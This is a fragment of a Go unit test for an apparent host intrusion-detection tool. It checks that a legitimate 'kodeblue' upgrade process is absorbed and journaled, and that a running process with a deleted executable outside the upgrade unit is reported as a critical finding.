	// End to end: the upgrade is absorbed and journaled; a deleted kodeblue
	// outside the unit is still a critical finding.
	r, err := d.Process(sensors.Snapshot{Ran: []string{"process"}, Items: []sensors.Item{upgrading}}, ModeDetect)
	if err != nil || len(r.New) != 0 {
		t.Fatalf("the upgrade process was reported: %v %+v", err, r.New)
	}
	journaled := false
	for _, j := range st.JournalSince(time.Now().Add(-time.Minute), 50) {
		if j.Action == "absorb.upgrade" && strings.Contains(j.Detail, "kodeblue-upgrade.service") {
			journaled = true
		}
	}
	if !journaled {
		t.Error("absorbing the upgrade process is not journaled")
	}
	_, env2, st2, _, _ := setup(t)
	d2 := New(st2, env2, opts)
	r, err = d2.Process(sensors.Snapshot{Ran: []string{"process"}, Items: []sensors.Item{item("/usr/local/bin/kodeblue@root", "sshd.service")}}, ModeDetect)
	if err != nil || len(r.New) != 1 || r.New[0].Rule != "process.deleted_exe" {
		t.Fatalf("a deleted kodeblue outside the upgrade unit must be reported: %v %+v", err, r.New)
	}
}
